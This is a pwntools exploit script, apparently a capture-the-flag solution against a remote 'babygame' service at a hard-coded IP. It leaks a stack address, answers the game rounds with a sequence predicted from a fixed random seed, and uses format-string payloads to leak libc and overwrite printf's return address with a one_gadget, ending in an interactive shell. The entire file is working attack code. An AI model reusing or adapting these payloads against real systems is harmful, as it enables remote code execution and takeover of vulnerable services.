from pwn import *

context.log_level = 'debug'
#io = process('./babygame')
#io = remote('ephemerally.top',28041)
io = remote('210.30.97.133',28054)
libc = ELF('./libc-2.31.so')

#array = '2200201002101010222212102111022002012211202100021200222010122210021112222212010012120010111002102101'   # srand(1)  on mac 
#array = '2212022112020202112200110002220111012222111002000102200100221101002120111101001021100110021101222110'    # srand(1) on linux
array = '2010020022010222200201201222100211002001201110112121112221101122121021001011022122002121101210012110'     # srand(0x61616161)
io.recvuntil(b'name:')
name = b'a'* 0x109
io.send(name)
io.recvuntil(b'a'*0x109)
stack = u64(io.recvuntil(b'\x7f')[-6:].ljust(0x8,b'\x00'))
printf_ret = stack - 0x218
printf_ret_offset = p64(printf_ret)[:1]
log.success('stack :' + hex(stack))
raw_input('>')

for i in range(100):
    io.recvuntil(b'round')
    io.send(str(array[i]))

raw_input('>')
io.recvuntil(b'you.')
#fmt = fmtstr_payload(6,{printf_ret:0x3e},numbwritten=0,write_size='byte') 
#fmt = b'aaa%059d' + p64(printf_ret) + b'%7$hhn%9$p'
fmt = b'%9$lx%50c%8$hhn'.ljust(0x10,b'a') + printf_ret_offset
io.send(fmt)
#raw_input('>')

p_printf = io.recvuntil(b'\x20',drop=True)
libc_base = int(p_printf,16) - 175 - libc.sym['printf']
log.success('libc: ' + hex(libc_base))
one_gadget = 0xe3b31
one_gadget += libc_base

#fmt = fmtstr_payload(6,{printf_ret:one_gadget},write_size='byte')
payload = b''
cur_size = 0
for i in range(6):
    target_size = (one_gadget >> (i * 8)) & 0xff
    if target_size > cur_size:
        payload += b'%' + str(target_size - cur_size).encode() + b'c'
    else:
        payload += b'%' + str(0x100 + target_size - cur_size).encode() + b'c'
    payload += b'%' + str(16 + i).encode() + b'$hhn'
    cur_size = target_size
payload = payload.ljust(0x50, b'a')
for i in range(6):
    payload += p64(printf_ret+ i)
io.sendlineafter('Good luck to you.\n', payload)


io.interactive()
